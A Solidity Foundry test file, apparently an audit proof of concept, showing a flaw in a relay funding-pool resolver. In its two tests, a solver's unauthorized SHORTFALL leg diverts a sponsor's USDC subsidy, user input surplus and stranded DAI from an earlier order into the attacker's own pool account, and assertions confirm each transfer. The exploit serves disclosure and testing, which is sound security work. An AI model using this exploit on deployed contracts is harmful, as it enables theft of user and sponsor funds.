// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {RelayFundingPool} from "settlement/funding-pools/RelayFundingPool.sol";
import {
    DrawAuthorization,
    DrawLegKind,
    IRelayFundingPool,
    SponsorshipConfig
} from "settlement/funding-pools/IRelayFundingPool.sol";
import {PoolDrawResolver} from "settlement/call-resolvers/PoolDrawResolver.sol";
import {
    DrawLeg,
    IRelayExecutorHasher,
    IRelayHubViewRegistry,
    PoolResolverBase
} from "settlement/call-resolvers/PoolResolverBase.sol";
import {Call} from "settlement/call-resolvers/ResolverSandbox.sol";
import {
    ExecuteAndWithdrawRequest,
    Fee,
    ICallResolver
} from "settlement/call-resolvers/ICallResolver.sol";

contract MockToken is ERC20 {
    constructor(string memory n, string memory s) ERC20(n, s) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice Minimal stand-in for RelayExecutor: only the request hash and the
/// privileged `execute` invocation matter to the resolver.
contract MockExecutor is IRelayExecutorHasher {
    function hashExecuteAndWithdrawRequest(
        ExecuteAndWithdrawRequest calldata request
    ) external view returns (bytes32) {
        return keccak256(abi.encode(request.orderAddress, request.nonce));
    }

    function run(
        address resolver,
        ExecuteAndWithdrawRequest calldata request,
        bytes calldata data
    ) external {
        ICallResolver(resolver).execute(request, false, data);
    }
}

/// @notice Minimal stand-in for RelayHub's view registry.
contract MockHub is IRelayHubViewRegistry {
    address public viewToken;
    constructor(address t) {
        viewToken = t;
    }
    function erc20Views(uint256) external view returns (address) {
        return viewToken;
    }
}

/// @notice PoC: a solver's SHORTFALL leg credits the resolver's ENTIRE holding
/// of an arbitrary token above `target` to any pool account - including user
/// order input, other accounts' sponsored draws, and stranded balances from
/// prior orders - without any draw, authorization, allowlist, or cap check.
///
/// The plan is solver-composed: the oracle signs the request nonce
/// (keccak(resolver || keccak(executionData))) blindly - the nonce is a
/// caller-supplied pass-through in the oracle's withdraw-and-fill API, which
/// never sees the legs. The pool cannot help: `credit()` only requires
/// RESOLVER_ROLE, which the resolver legitimately holds.
contract ShortfallDiversionTest is Test {
    MockToken internal usdc;
    MockToken internal dai;
    RelayFundingPool internal pool;
    PoolDrawResolver internal resolver;
    MockExecutor internal executor;
    MockHub internal hub;

    uint256 internal sponsorAuthPk = 0xAA11;
    address internal sponsorAuth;
    address internal sponsor = address(0x5B05);
    address internal solver = address(0x5018); // attacker: solver + pool account
    address internal platform = address(0x9A7F);

    function setUp() public {
        sponsorAuth = vm.addr(sponsorAuthPk);

        usdc = new MockToken("USDC", "USDC");
        dai = new MockToken("DAI", "DAI");
        usdc.mint(address(this), 1_000_000e6);
        dai.mint(address(this), 1_000_000e18);

        executor = new MockExecutor();
        hub = new MockHub(address(usdc));
        resolver = new PoolDrawResolver(address(executor), address(hub));
        pool = new RelayFundingPool(address(this), platform, address(resolver));

        // Sponsor funds 50 USDC and authorizes draws for orders via sponsorAuth.
        usdc.mint(sponsor, 50e6);
        vm.startPrank(sponsor);
        usdc.approve(address(pool), 50e6);
        pool.depositFor(sponsor, address(usdc), 50e6);
        pool.setSponsorshipConfig(
            address(usdc),
            SponsorshipConfig({
                perOrderCap: 100e6,
                budget: type(uint256).max,
                authorizer: sponsorAuth,
                expiry: 0
            })
        );
        pool.setSponsorshipResolver(address(resolver), true);
        vm.stopPrank();
    }

    function _authFor(
        address account,
        address orderAddress
    ) internal view returns (bytes memory) {
        bytes32 digest = pool.hashDrawAuthorization(
            DrawAuthorization({account: account, orderAddress: orderAddress})
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(sponsorAuthPk, digest);
        return abi.encodePacked(r, s, v);
    }

    function _request(
        address orderAddress,
        bytes32 nonce,
        uint256 outMin
    ) internal view returns (ExecuteAndWithdrawRequest memory) {
        return
            ExecuteAndWithdrawRequest({
                inChainId: "1",
                inCurrency: abi.encodePacked(address(usdc)),
                outChainId: "1",
                outCurrency: abi.encodePacked(address(usdc)),
                outAmountMinimum: outMin,
                depository: abi.encodePacked(address(0xD3D3)),
                orderAddress: orderAddress,
                receiver: abi.encodePacked(address(0xB0B)),
                data: "",
                fees: new Fee[](0),
                nonce: nonce,
                deadline: block.timestamp + 1 days
            });
    }

    function _commit(
        PoolDrawResolver.Execution memory execution
    ) internal view returns (bytes memory executionData, bytes32 nonce) {
        executionData = abi.encode(execution);
        nonce = keccak256(
            abi.encodePacked(address(resolver), keccak256(executionData))
        );
    }

    /// @notice Solver diverts the sponsor's 50 USDC subsidy PLUS 100 USDC of
    /// user input surplus into their own pool account, while the executor
    /// still receives its 900 USDC minimum. The SHORTFALL leg carries NO
    /// authorization bytes at all - the credit path never checks any.
    function test_divertSponsorSubsidyAndUserSurplus() public {
        address orderAddress = address(0x0D3A);
        uint256 orderInput = 1000e6; // user deposit, funded into the resolver
        uint256 sponsorDraw = 50e6;
        uint256 minimumOut = 900e6;

        // Leg 0: FIXED leg draws the sponsor's 50 USDC (properly authorized).
        // Leg 1: SHORTFALL leg, token = the ORDER INPUT, target = minimum.
        // No draw happens (balance 1050 >= target 900), so no authorization
        // is verified - yet the 150 USDC surplus is credited to the solver.
        DrawLeg[] memory legs = new DrawLeg[](2);
        legs[0] = DrawLeg({
            pool: address(pool),
            account: sponsor,
            kind: DrawLegKind.FIXED,
            tokenIn: address(usdc),
            tokenOut: address(usdc),
            amount: sponsorDraw,
            amountOutMinimum: 0,
            calls: new Call[](0)
        });
        legs[1] = DrawLeg({
            pool: address(pool),
            account: solver,
            kind: DrawLegKind.SHORTFALL_TO_TARGET,
            tokenIn: address(usdc),
            tokenOut: address(usdc),
            amount: minimumOut,
            amountOutMinimum: 0,
            calls: new Call[](0)
        });
        PoolDrawResolver.Execution memory execution = PoolDrawResolver
            .Execution({legs: legs, calls: new Call[](0), salt: bytes32(uint256(1))});
        (bytes memory executionData, bytes32 nonce) = _commit(execution);

        bytes[] memory auths = new bytes[](2);
        auths[0] = _authFor(sponsor, orderAddress);
        auths[1] = ""; // SHORTFALL leg: NO authorization whatsoever
        bytes memory data = abi.encode(executionData, auths);

        // Executor funds the resolver with the order input, then executes.
        usdc.transfer(address(resolver), orderInput);
        executor.run(
            address(resolver),
            _request(orderAddress, nonce, minimumOut),
            data
        );

        // Solver pocketed 150 USDC: the 50 sponsor subsidy + 100 user surplus.
        assertEq(pool.balances(solver, address(usdc)), 150e6);
        // Sponsor's draw was fully consumed - none of it reached the user.
        assertEq(pool.balances(sponsor, address(usdc)), 0);
        // Executor still got exactly its minimum, so settlement "succeeds".
        assertEq(usdc.balanceOf(address(executor)), minimumOut);
        // And the pool's own books show the FIXED leg as a legitimate draw.
        assertEq(pool.orderDraws(orderAddress, sponsor, address(usdc)), sponsorDraw);
        console.log("DIVERTED 150 USDC (50 sponsor subsidy + 100 user surplus) to solver pool account");
    }

    /// @notice Same flaw, cross-order variant: a SHORTFALL leg on a token the
    /// resolver holds as STRANDED residue from a prior order (non-request
    /// tokens are never swept) credits the whole stranded balance to the
    /// solver's account - no draw, no authorization, no relationship to this
    /// order at all.
    function test_divertStrandedBalanceFromPriorOrder() public {
        address orderAddress = address(0x0D3B);
        uint256 stranded = 25e18;

        // Stranded DAI left in the resolver by an earlier order's leg output
        // (PoolDrawResolver only sweeps the request in/out tokens).
        dai.transfer(address(resolver), stranded);

        DrawLeg[] memory legs = new DrawLeg[](1);
        legs[0] = DrawLeg({
            pool: address(pool),
            account: solver,
            kind: DrawLegKind.SHORTFALL_TO_TARGET,
            tokenIn: address(dai),
            tokenOut: address(dai),
            amount: 0, // target zero: credit the entire holding
            amountOutMinimum: 0,
            calls: new Call[](0)
        });
        PoolDrawResolver.Execution memory execution = PoolDrawResolver
            .Execution({legs: legs, calls: new Call[](0), salt: bytes32(uint256(2))});
        (bytes memory executionData, bytes32 nonce) = _commit(execution);

        bytes[] memory auths = new bytes[](1);
        auths[0] = ""; // no authorization
        bytes memory data = abi.encode(executionData, auths);

        // Order input passes through untouched (USDC in == USDC out).
        usdc.transfer(address(resolver), 1000e6);
        executor.run(address(resolver), _request(orderAddress, nonce, 1000e6), data);

        assertEq(pool.balances(solver, address(dai)), stranded);
        assertEq(usdc.balanceOf(address(executor)), 1000e6);
        console.log("DIVERTED 25 stranded DAI from a prior order to solver pool account");
    }
}
